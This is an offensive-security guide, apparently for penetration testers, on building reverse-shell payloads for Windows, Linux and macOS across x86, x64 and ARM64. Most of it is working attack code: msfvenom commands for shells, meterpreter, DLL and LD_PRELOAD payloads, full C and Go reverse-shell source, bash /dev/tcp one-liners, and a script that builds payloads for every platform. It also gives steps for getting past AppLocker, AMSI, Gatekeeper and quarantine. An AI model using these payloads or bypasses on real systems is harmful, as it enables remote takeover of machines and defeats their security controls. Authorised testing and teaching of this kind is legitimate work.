# Cross-Platform Payload Generation Guide

> Comprehensive guide to generating payloads for Windows, Linux, and macOS targets. Covers architecture considerations (x86, x64, ARM64), cross-compilation techniques, platform-specific execution constraints, and reliable payload delivery across heterogeneous environments.

## Introduction

Real-world penetration testing engagements rarely target a single operating system. Enterprise networks run Windows workstations, Linux servers, macOS developer machines, and increasingly ARM-based devices. Each platform has distinct executable formats, system APIs, security mechanisms, and runtime constraints that directly affect payload generation choices. A payload that works perfectly on Windows x64 may crash silently on Linux ARM64 or fail entirely on macOS with Gatekeeper enabled.

The challenge of cross-platform payload generation goes beyond simply selecting the right msfvenom format flag. It requires understanding how each operating system loads executables, how security features (AMSI on Windows, SIP on macOS, SELinux on Linux) interfere with payload execution, and how architecture differences (calling conventions, system call numbers, instruction sets) affect shellcode compatibility. This guide addresses each platform systematically and provides practical techniques for generating reliable payloads across the full spectrum of target environments.

Cross-platform considerations affect every stage of the attack chain: the initial payload format (PE, ELF, Mach-O, script), the architecture targeting (x86, x64, ARM64), the execution method (direct execution, injection, interpretation), and the post-exploitation tooling. Making the wrong choice at any stage results in silent failures that waste engagement time and may alert defenders.

**Learning objectives**:

- Generate platform-appropriate payloads for Windows, Linux, and macOS
- Understand architecture differences (x86 vs x64 vs ARM64) and their impact on payloads
- Apply cross-compilation techniques for custom payloads
- Navigate platform-specific security features that affect payload execution
- Build payload generation pipelines that produce multiple formats simultaneously
- Troubleshoot cross-platform payload failures systematically

**Prerequisites**: Familiarity with msfvenom payload generation (see `msfvenom-payload-generation-guide.md`). Understanding of executable file formats (PE, ELF, Mach-O). Basic knowledge of CPU architectures.

---

## Practical Steps

### Step 1: Platform and Architecture Identification

Before generating payloads, identify the target platform and architecture precisely. The wrong architecture selection is the most common cause of silent payload failures.

**Remote Platform Identification**

```bash
# Identify OS and architecture from shell access
# Linux:
uname -a
cat /etc/os-release
arch
file /bin/ls

# Windows:
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
# Or PowerShell:
[System.Environment]::OSVersion.Platform
[System.Environment]::Is64BitOperatingSystem
[System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture

# macOS:
sw_vers
uname -m
sysctl -n hw.optional.arm64  # 1 = ARM64 (Apple Silicon)
```

**Architecture Decision Matrix**

| Target Architecture | msfvenom Arch Flag | Executable Format | Key Consideration |
|---|---|---|---|
| Windows x86 | `x86/` | PE (.exe, .dll) | Runs on both x86 and x64 via WoW64 |
| Windows x64 | `x64/` | PE (.exe, .dll) | Preferred for modern Windows; x86 payloads also work |
| Linux x86 | `linux/x86/` | ELF | Legacy 32-bit systems |
| Linux x64 | `linux/x64/` | ELF | Standard for modern Linux servers |
| Linux ARM64 | `linux/aarch64/` | ELF | Raspberry Pi, AWS Graviton, mobile |
| macOS x64 | `osx/x64/` | Mach-O | Intel Macs |
| macOS ARM64 | `osx/aarch64/` | Mach-O | Apple Silicon (M1/M2/M3) |

### Step 2: Windows Payload Generation

Windows is the most common target in enterprise environments. Multiple payload formats are available depending on the delivery mechanism and evasion requirements.

**Standard Executable Payloads**

```bash
# Windows x64 reverse TCP shell (most reliable)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell_x64.exe

# Windows x64 meterpreter (staged -- requires multi/handler)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o meter_staged.exe

# Windows x64 meterpreter (stageless -- self-contained)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o meter_stageless.exe

# Compare sizes
ls -la shell_x64.exe meter_staged.exe meter_stageless.exe
# shell_x64.exe:       ~7KB (minimal reverse shell)
# meter_staged.exe:    ~15KB (stager downloads second stage)
# meter_stageless.exe: ~200KB+ (full meterpreter embedded)
```

**DLL Payloads**

```bash
# DLL for DLL injection or side-loading
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll -o payload.dll

# DLL with custom entry point for side-loading
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll -o evil.dll

# Usage: place evil.dll next to legitimate application that loads DLLs by name
# The application loads evil.dll instead of the real dependency
rundll32.exe payload.dll,Entry
```

**PowerShell Payloads**

```bash
# PowerShell reverse shell script
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f ps1 -o shell.ps1

# PowerShell one-liner (for web_delivery or command injection)
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f psh-reflection -o shell.ps1

# Encoded PowerShell command (bypasses command-line logging)
# Generate base64-encoded payload
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f psh-cmd -o encoded.txt
# Content is a powershell -enc <base64> one-liner

# Nishang reverse shell (PowerShell module)
# Download and import:
Import-Module ./nishang.ps1
Invoke-PowerShellTcp -Reverse -IPAddress 10.0.0.1 -Port 4444
```

**Windows Security Feature Considerations**

```bash
# AMSI bypass: modern Windows uses AMSI to inspect PowerShell content
# Anti-AMSI techniques include patching AMSI in memory before payload execution

# AppLocker / WDAC bypass: applications may be restricted
# Bypass techniques:
# 1. Use installutil.exe (LOLBin) to execute payloads
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f csharp -o payload.cs
# Compile and execute via installutil: InstallUtil.exe /logfile= /LogToConsole=false payload.exe

# 2. Use msbuild.exe to execute C# payloads from XML
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f csharp -o shell.cs
# Wrap in MSBuild XML and execute: msbuild.exe shell.xml

# 3. Use regsvr32.exe for script-based execution
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f psh-cmd -o payload.txt
# Wrap in .sct file: regsvr32.exe /s /n /u /i:payload.sct scrobj.dll
```

### Step 3: Linux Payload Generation

Linux payloads target ELF executables, shared objects, and script-based formats. The key considerations are architecture matching, executable permissions, and libc compatibility.

**Standard ELF Payloads**

```bash
# Linux x64 reverse shell (ELF executable)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell_x64.elf
chmod +x shell_x64.elf

# Linux x64 meterpreter (staged)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o meter_staged.elf

# Linux x64 meterpreter (stageless)
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o meter_stageless.elf

# Linux x86 (32-bit legacy systems)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell_x86.elf
```

**Linux Shared Object (.so) Payloads**

```bash
# Shared object for LD_PRELOAD injection
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf-so -o payload.so

# Execute via LD_PRELOAD:
# LD_PRELOAD=./payload.so /bin/ls

# Shared object for library hijacking
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf-so -o evil_lib.so
# Place in library search path to be loaded by target application
```

**Linux Architecture-Specific Payloads**

```bash
# ARM64/AArch64 (AWS Graviton, Raspberry Pi 4, Apple Silicon under Linux)
msfvenom -p linux/aarch64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell_arm64.elf

# ARM (older Raspberry Pi, IoT devices)
msfvenom -p linux/armle/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell_arm.elf

# MIPS (routers, embedded devices)
msfvenom -p linux/mipsle/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell_mips.elf

# Check payload availability for architecture
msfvenom --list payloads | grep "linux/aarch64"
msfvenom --list payloads | grep "linux/mipsle"
```

**Linux Execution Constraints**

```bash
# SELinux may block payload execution
# Check SELinux status:
getenforce
# If "Enforcing", may need to use permitted execution paths

# Executable stack may be blocked (NX bit)
# Test with: execstack -q payload.elf
# If stack is non-executable, shellcode-based payloads may fail
# Solution: use return-oriented programming (ROP) or system call payloads

# libc version compatibility
# Statically linked payloads avoid libc dependency issues
# Check if payload is dynamically or statically linked:
file shell_x64.elf
ldd shell_x64.elf
# If dynamic, ensure target has compatible libc version
```

### Step 4: macOS Payload Generation

macOS presents unique challenges due to its security architecture (Gatekeeper, SIP, AMFI) and the transition from Intel to Apple Silicon (ARM64).

**macOS Mach-O Payloads**

```bash
# macOS x64 (Intel Macs)
msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f macho -o shell_x64_mac

# macOS ARM64 (Apple Silicon: M1/M2/M3)
msfvenom -p osx/aarch64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f macho -o shell_arm64_mac

# Universal binary (contains both x64 and ARM64)
# Create using lipo after generating both architectures
lipo -create -output shell_universal shell_x64_mac shell_arm64_mac

# Make executable
chmod +x shell_x64_mac shell_arm64_mac shell_universal
```

**macOS Script-Based Payloads**

```bash
# Python reverse shell (most reliable on macOS -- Python3 always available)
msfvenom -p python/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell_mac.py
python3 shell_mac.py

# Shell script payload
msfvenom -p cmd/unix/reverse_bash LHOST=10.0.0.1 LPORT=4444 -f raw -o shell_mac.sh
chmod +x shell_mac.sh

# AppleScript execution (for phishing or user interaction scenarios)
osascript -e 'do shell script "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"'

# Swift-based payload (avoids Python dependency)
cat > Shell.swift << 'SWIFT'
import Foundation
let task = Process()
task.executableURL = URL(fileURLWithPath: "/bin/bash")
task.arguments = ["-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"]
try? task.run()
RunLoop.main.run(until: Date(timeIntervalSinceNow: 1))
SWIFT
swiftc Shell.swift -o shell_mac_swift
```

**macOS Security Bypass Considerations**

```bash
# Gatekeeper: blocks unsigned/unnotarized applications
# Bypass: use script-based payloads that don't trigger Gatekeeper
# Gatekeeper only checks .app bundles and disk images, not raw scripts or binaries run from terminal

# SIP (System Integrity Protection): protects system files
# Cannot write to /usr/bin, /System, or /sbin even with root
# Workaround: write to user-writable paths (/usr/local/bin, /tmp, user home)

# AMFI (Apple Mobile File Integrity): code signing enforcement
# On Apple Silicon, all executables must be signed (even ad-hoc)
# Ad-hoc sign a payload:
codesign --force --sign - shell_arm64_mac

# Quarantine attribute: downloaded files may be quarantined
# Check quarantine:
xattr -l shell_arm64_mac
# Remove quarantine:
xattr -d com.apple.quarantine shell_arm64_mac
```

### Step 5: Cross-Compilation for Custom Payloads

When msfvenom does not have the exact payload needed, cross-compilation enables custom C/Rust/Go payloads targeting any architecture.

**Cross-Compilation with GCC**

```bash
# Install cross-compilers
sudo apt install gcc-mingw-w64-x86-64 gcc-mingw-w64-i686 gcc-aarch64-linux-gnu gcc-arm-linux-gnueabihf

# Cross-compile C payload for Windows x64
x86_64-w64-mingw32-gcc -o payload.exe payload.c -lws2_32

# Cross-compile for Linux ARM64
aarch64-linux-gnu-gcc -o payload_arm64 payload.c -static

# Cross-compile for Linux ARM
arm-linux-gnueabihf-gcc -o payload_arm payload.c -static

# Example cross-platform C reverse shell:
cat > reverse_shell.c << 'CCODE'
#ifdef _WIN32
#include <winsock2.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#endif

#include <string.h>

int main() {
    const char* host = "10.0.0.1";
    int port = 4444;

#ifdef _WIN32
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(host);
    connect(sock, (struct sockaddr*)&addr, sizeof(addr));

    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
#else
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, host, &addr.sin_addr);
    connect(sock, (struct sockaddr*)&addr, sizeof(addr));

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    execve("/bin/sh", NULL, NULL);
#endif
    return 0;
}
CCODE
```

**Cross-Compilation with Go**

```bash
# Go provides excellent cross-compilation support
cat > shell.go << 'GO'
package main

import (
    "net"
    "os"
    "os/exec"
    "runtime"
    "syscall"
)

func main() {
    conn, err := net.Dial("tcp", "10.0.0.1:4444")
    if err != nil { return }

    var cmd *exec.Cmd
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd.exe")
    } else {
        cmd = exec.Command("/bin/sh")
    }

    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn
    cmd.SysProcAttr = &syscall.SysProcAttr{
        Setpgid: true,
    }
    cmd.Run()
}
GO

# Cross-compile for all platforms:
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o shell_windows.exe shell.go
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o shell_linux_amd64 shell.go
GOOS=linux GOARCH=arm64 go build -ldflags="-s -w" -o shell_linux_arm64 shell.go
GOOS=darwin GOARCH=amd64 go build -ldflags="-s -w" -o shell_macos_intel shell.go
GOOS=darwin GOARCH=arm64 go build -ldflags="-s -w" -o shell_macos_arm shell.go

# Verify builds:
file shell_windows.exe shell_linux_amd64 shell_linux_arm64 shell_macos_intel shell_macos_arm
```

**Cross-Compilation with Rust**

```bash
# Install cross-compilation targets
rustup target add x86_64-pc-windows-gnu
rustup target add aarch64-unknown-linux-gnu
rustup target add x86_64-unknown-linux-musl
rustup target add aarch64-apple-darwin

# Cross-compile
cargo build --release --target x86_64-pc-windows-gnu
cargo build --release --target aarch64-unknown-linux-gnu
cargo build --release --target x86_64-unknown-linux-musl

# MUSL targets produce fully static binaries (no libc dependency)
```

### Step 6: Automated Multi-Platform Payload Pipeline

Generate payloads for all target platforms in a single automated build process.

```bash
# Multi-platform payload generation script
cat > generate_all_payloads.sh << 'SCRIPT'
#!/bin/bash

LHOST="10.0.0.1"
LPORT="4444"
OUTPUT_DIR="./payloads_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

echo "[*] Generating payloads for LHOST=$LHOST LPORT=$LPORT"

# Windows payloads
echo "[+] Windows x64..."
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o "$OUTPUT_DIR/win_x64_shell.exe" 2>/dev/null
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o "$OUTPUT_DIR/win_x64_meter.exe" 2>/dev/null
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f dll -o "$OUTPUT_DIR/win_x64_shell.dll" 2>/dev/null
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f ps1 -o "$OUTPUT_DIR/win_x64_shell.ps1" 2>/dev/null

# Linux payloads
echo "[+] Linux x64..."
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o "$OUTPUT_DIR/lin_x64_shell.elf" 2>/dev/null
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o "$OUTPUT_DIR/lin_x64_meter.elf" 2>/dev/null

echo "[+] Linux ARM64..."
msfvenom -p linux/aarch64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o "$OUTPUT_DIR/lin_arm64_shell.elf" 2>/dev/null

# macOS payloads
echo "[+] macOS x64..."
msfvenom -p osx/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f macho -o "$OUTPUT_DIR/mac_x64_shell" 2>/dev/null

echo "[+] macOS ARM64..."
msfvenom -p osx/aarch64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f macho -o "$OUTPUT_DIR/mac_arm64_shell" 2>/dev/null

# Cross-platform scripts
echo "[+] Cross-platform scripts..."
msfvenom -p python/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o "$OUTPUT_DIR/cross_python_shell.py" 2>/dev/null
msfvenom -p cmd/unix/reverse_bash LHOST=$LHOST LPORT=$LPORT -f raw -o "$OUTPUT_DIR/cross_bash_shell.sh" 2>/dev/null
msfvenom -p cmd/unix/reverse_perl LHOST=$LHOST LPORT=$LPORT -f raw -o "$OUTPUT_DIR/cross_perl_shell.pl" 2>/dev/null

# Make executables
chmod +x "$OUTPUT_DIR"/*.elf "$OUTPUT_DIR"/mac_*

# Summary
echo ""
echo "=== Payload Generation Complete ==="
echo "Output: $OUTPUT_DIR"
ls -la "$OUTPUT_DIR" | awk 'NR>1 {printf "  %-40s %8s bytes\n", $NF, $5}'

# Generate checksums
sha256sum "$OUTPUT_DIR"/* > "$OUTPUT_DIR/checksums.sha256"
echo "[+] Checksums saved to $OUTPUT_DIR/checksums.sha256"
SCRIPT

chmod +x generate_all_payloads.sh
./generate_all_payloads.sh
```

### Step 7: Architecture-Specific Troubleshooting

When payloads fail on specific architectures, systematic troubleshooting identifies the root cause.

```bash
# Verify payload matches target architecture
file shell_x64.exe        # Should show "PE32+ executable... x86-64"
file shell_x86.exe        # Should show "PE32 executable... Intel 80386"
file shell_x64.elf        # Should show "ELF 64-bit... x86-64"
file shell_arm64.elf      # Should show "ELF 64-bit... ARM aarch64"

# Common failure: x86 payload on x64 target
# Symptom: "Exec format error" or silent crash
# Fix: use x64 payloads for x64 systems

# Common failure: dynamically linked payload on minimal container
# Symptom: "No such file or directory" despite file existing
# Cause: missing dynamic linker
# Check: ldd payload.elf
# Fix: compile with -static or use stageless payloads

# Common failure: macOS unsigned binary on Apple Silicon
# Symptom: "bad CPU type in executable" or Gatekeeper block
# Fix: codesign --force --sign - payload
# Also: xattr -cr payload (remove quarantine)

# Common failure: ARM payload on MIPS device (or vice versa)
# Symptom: "Illegal instruction" crash
# Fix: verify target architecture with `uname -m` before generating

# Network connectivity verification
# If payload executes but no callback:
# 1. Check firewall on attacker side: sudo ufw allow 4444/tcp
# 2. Check listener is running: ss -tlnp | grep 4444
# 3. Check target can reach attacker: curl http://10.0.0.1:4444
# 4. Try alternative port (443, 80, 53) if egress filtering suspected
```

---

## Hands-on Exercises

### Exercise 1: Multi-Platform Payload Generation

**Scenario**: You are preparing for a penetration test targeting a heterogeneous network with Windows 11 workstations, Ubuntu 22.04 servers (x64 and ARM64), and macOS developer machines (both Intel and Apple Silicon).

1. Generate appropriate payloads for each target platform using msfvenom
2. For each payload, verify the format and architecture with the `file` command
3. Cross-compile a custom C reverse shell for all target platforms
4. Create a Go-based payload that compiles for all platforms with a single build script
5. Document the size differences between staged, stageless, and script payloads for each platform

**Expected outcome**: A complete payload kit covering all five target configurations (Windows x64, Linux x64, Linux ARM64, macOS Intel, macOS ARM64) with verification that each payload format matches its intended platform.

### Exercise 2: macOS Security Bypass Testing

**Scenario**: A developer workstation running macOS Ventura with Apple Silicon (M2) needs to be tested for payload execution security controls.

1. Generate an ARM64 Mach-O reverse shell payload
2. Attempt direct execution -- observe Gatekeeper/SIP behavior
3. Ad-hoc code sign the payload and retry
4. Remove quarantine attributes and retry
5. Test script-based alternatives (Python, Bash, Swift)
6. Document which execution methods succeed and which are blocked

**Expected outcome**: Understanding of macOS security layers (Gatekeeper, AMFI, SIP, Quarantine) and which payload types bypass each layer. A documented execution path for the target macOS configuration.

### Exercise 3: Cross-Platform Build Pipeline

**Scenario**: Build an automated payload generation pipeline that produces consistent payloads across all platforms from a single configuration.

1. Write a shell script that takes LHOST and LPORT as parameters
2. Generate payloads for Windows (exe, dll, ps1), Linux (elf for x64 and arm64), and macOS (macho for x64 and arm64)
3. Include script-based payloads (Python, Bash, Perl) as cross-platform fallbacks
4. Generate SHA256 checksums for all outputs
5. Create a summary report listing each payload with its platform, format, size, and architecture

**Expected outcome**: A reusable build script that generates a complete cross-platform payload kit in under 60 seconds. All payloads verified against their target platforms with checksums for integrity verification.

---

## References

1. **msfvenom Documentation**: https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html -- Complete payload format reference
2. **MITRE ATT&CK T1027 - Obfuscated Files**: https://attack.mitre.org/techniques/T1027/ -- Payload obfuscation across platforms
3. **PE Format Specification**: https://docs.microsoft.com/en-us/windows/win32/debug/pe-format -- Windows executable format
4. **ELF Format Specification**: https://refspecs.linuxbase.org/elf/elf.pdf -- Linux executable format
5. **Mach-O Format**: https://developer.apple.com/documentation/xcode/mach-o-file-format -- macOS executable format
6. **Go Cross-Compilation**: https://go.dev/doc/install/source#environment -- Go cross-platform build instructions
7. **Mingw-w64 Cross-Compiler**: https://www.mingw-w64.org/ -- Windows cross-compilation from Linux
8. **HackTricks - Shells**: https://book.hacktricks.xyz/generic-methodologies-and-resources/shells -- Cross-platform shell reference
9. **Rust Cross-Compilation**: https://rust-lang.github.io/rustup/cross-compilation.html -- Rust cross-compilation targets
